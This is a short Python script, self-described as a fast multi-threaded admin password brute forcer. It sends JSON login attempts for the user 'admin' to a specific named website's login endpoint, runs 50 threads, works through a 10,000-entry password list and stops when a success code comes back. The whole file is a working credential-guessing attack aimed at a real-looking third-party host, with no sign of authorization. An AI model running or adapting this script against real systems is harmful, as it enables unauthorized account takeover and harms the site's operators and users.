#!/usr/bin/env python3
"""Fast multi-threaded admin password brute forcer."""
import json, sys, time, urllib.request, concurrent.futures

TARGET = "http://jxzlpjxt.xingyebao.com/Login/index"
WORDLIST = r"D:\desk\ai测试系统\data\wordlists\passwords_top10k.txt"
CONCURRENT = 50

def test_password(pw):
    try:
        data = json.dumps({"job_number": "admin", "password": pw}).encode()
        req = urllib.request.Request(TARGET, data=data,
            headers={"Content-Type": "application/json"}, method="POST")
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode()
            if '"code":10000' in body:
                return ("FOUND", pw, body)
            if '"code":11104' in body:
                return ("ERROR", pw, "user not found")
    except Exception as e:
        return ("ERR", pw, str(e))
    return ("WRONG", pw, None)

def main():
    with open(WORDLIST, "r", encoding="utf-8") as f:
        passwords = [line.strip() for line in f if line.strip()]

    total = len(passwords)
    print(f"Total passwords: {total}, workers: {CONCURRENT}")

    tested = 0
    start = time.time()

    with concurrent.futures.ThreadPoolExecutor(max_workers=CONCURRENT) as executor:
        futures = {executor.submit(test_password, pw): (i, pw) for i, pw in enumerate(passwords)}
        for future in concurrent.futures.as_completed(futures):
            tested += 1
            _, pw = futures[future]
            status, _, detail = future.result()

            if status == "FOUND":
                elapsed = time.time() - start
                print(f"\n!!! PASSWORD FOUND: {pw} !!!")
                print(f"Response: {detail}")
                print(f"Time: {elapsed:.1f}s, tested: {tested}")
                executor.shutdown(wait=False, cancel_futures=True)
                sys.exit(0)
            elif status == "ERROR":
                print(f"\nERROR: admin not found? pw={pw}")
                sys.exit(1)

            if tested % 500 == 0:
                elapsed = time.time() - start
                rate = tested / elapsed
                eta = (total - tested) / rate
                print(f"Progress: {tested}/{total} ({tested*100/total:.1f}%) rate={rate:.0f}/s ETA={eta:.0f}s", flush=True)

    elapsed = time.time() - start
    print(f"\nNo password found. Tested {total} in {elapsed:.1f}s")
    sys.exit(1)

if __name__ == "__main__":
    main()
